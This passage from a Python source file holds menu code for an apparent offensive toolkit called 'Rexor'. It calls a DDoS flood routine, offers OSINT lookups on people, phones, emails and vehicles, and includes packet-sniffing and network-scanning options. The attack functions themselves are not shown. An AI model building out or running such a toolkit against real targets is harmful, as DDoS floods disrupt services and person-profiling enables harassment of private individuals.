            extra = input(Fore.RED + "Server/Broadcast IP: " + Style.RESET_ALL).strip()
        self.floods.ddos(method, ip, port, threads, sockets, size, extra=extra)
        input(Fore.RED + "Press Enter to continue..." + Style.RESET_ALL)

    def osint_menu(self):
        self.show_banner()
        ce.print("""[bold red]
Rexor {
    "OSINT": {
        "1": "Username Search (75+ Platforms)",
        "2": "Email OSINT",
        "3": "Phone OSINT",
        "4": "IP Geolocation",
        "5": "Domain OSINT",
        "6": "Port Scanner",
        "7": "Deep Social Search",
        "8": "Email to Social",
        "9": "Reverse Image Search",
        "10": "Darknet Search",
        "11": "Crypto Address Lookup",
        "12": "Vehicle Lookup",
        "13": "Person Search",
        "14": "Company OSINT",
        "15": "SSH/Telnet Banner",
        "16": "HTTP Headers",
        "17": "SSL Certificate",
        "18": "Robots.txt Fetch",
        "19": "Sitemap.xml Fetch",
        "20": "Metadata Extract"
    },
    "0": "Back"
}
[/bold red]""")
        user = input(Fore.RED + "OSINT > " + Style.RESET_ALL).strip()
        if user == "1":
            username = input(Fore.RED + "Username: " + Style.RESET_ALL).strip()
            if username: self.osint.username_search(username)
            else: ce.print("[bold red][!] Please enter a username[/bold red]")
        elif user == "2":
            email = input(Fore.RED + "Email: " + Style.RESET_ALL).strip()
            if email: self.osint.email_osint(email)
        elif user == "3":
            phone = input(Fore.RED + "Phone: " + Style.RESET_ALL).strip()
            if phone: self.osint.phone_osint(phone)
        elif user == "4":
            ip = input(Fore.RED + "IP: " + Style.RESET_ALL).strip()
            if ip: self.osint.ip_geolocation(ip)
        elif user == "5":
            domain = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if domain: self.osint.domain_osint(domain)
        elif user == "6":
            ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL).strip()
            if ip: self.osint.port_scanner(ip)
        elif user == "7":
            username = input(Fore.RED + "Username: " + Style.RESET_ALL).strip()
            if username: self.osint.social_media_deep(username)
        elif user == "8":
            email = input(Fore.RED + "Email: " + Style.RESET_ALL).strip()
            if email: self.osint.email_to_social(email)
        elif user == "9":
            url = input(Fore.RED + "Image URL: " + Style.RESET_ALL).strip()
            if url: self.osint.reverse_image_search_prep(url)
        elif user == "10":
            query = input(Fore.RED + "Search Query: " + Style.RESET_ALL).strip()
            if query: self.osint.darknet_search(query)
        elif user == "11":
            addr = input(Fore.RED + "Crypto Address: " + Style.RESET_ALL).strip()
            if addr: self.osint.crypto_address_check(addr)
        elif user == "12":
            vin = input(Fore.RED + "VIN or Plate: " + Style.RESET_ALL).strip()
            if vin: self.osint.vehicle_lookup(vin)
        elif user == "13":
            name = input(Fore.RED + "Full Name: " + Style.RESET_ALL).strip()
            loc = input(Fore.RED + "Location (optional): " + Style.RESET_ALL).strip()
            if name: self.osint.person_search(name, loc)
        elif user == "14":
            company = input(Fore.RED + "Company Name: " + Style.RESET_ALL).strip()
            if company: self.osint.company_osint(company)
        elif user in ["15","16","17","18","19","20"]:
            target = input(Fore.RED + "Target URL/IP: " + Style.RESET_ALL).strip()
            if target:
                ce.print(f"[bold red][*] Feature {user} for {target}[/bold red]")
                ce.print(f"[bold red]    Try manually: curl -v {target}[/bold red]")
                ce.print(f"[bold red]    Or: curl -I {target}[/bold red]")
        elif user == "0": return
        input(Fore.RED + "Press Enter to continue..." + Style.RESET_ALL)

    def sniffer_menu(self):
        self.show_banner()
        ce.print("""[bold red]
Rexor {
    "Sniffer": {
        "1": "Packet Sniffer",
        "2": "WiFi Scanner",
        "3": "Network Scanner",
        "4": "ARP Spoof Detection",
        "5": "DNS Sniffer"
    },
    "0": "Back"
}
[/bold red]""")
        user = input(Fore.RED + "SNIFFER > " + Style.RESET_ALL).strip()
        if user == "1":
            iface = input(Fore.RED + "Interface (blank=default): " + Style.RESET_ALL).strip() or None
            self.sniffer.packet_sniffer(iface)
        elif user == "2": self.sniffer.scan_wifi()
        elif user == "3":
            subnet = input(Fore.RED + "Subnet: " + Style.RESET_ALL).strip()
            if subnet: self.sniffer.network_scanner(subnet)
        elif user == "4": self.sniffer.arp_spoof_detect()
        elif user == "5": self.sniffer.dns_sniffer()
        elif user == "0": return
        input(Fore.RED + "Press Enter to continue..." + Style.RESET_ALL)


if __name__ == "__main__":
    try:
        app = Rexor()
        app.run()
    except KeyboardInterrupt:
        ce.print("\n[bold red][!] Rexor terminated by user[/bold red]")
    except Exception as e:
        ce.print(f"\n[bold red][!] Unexpected error: {e}[/bold red]")
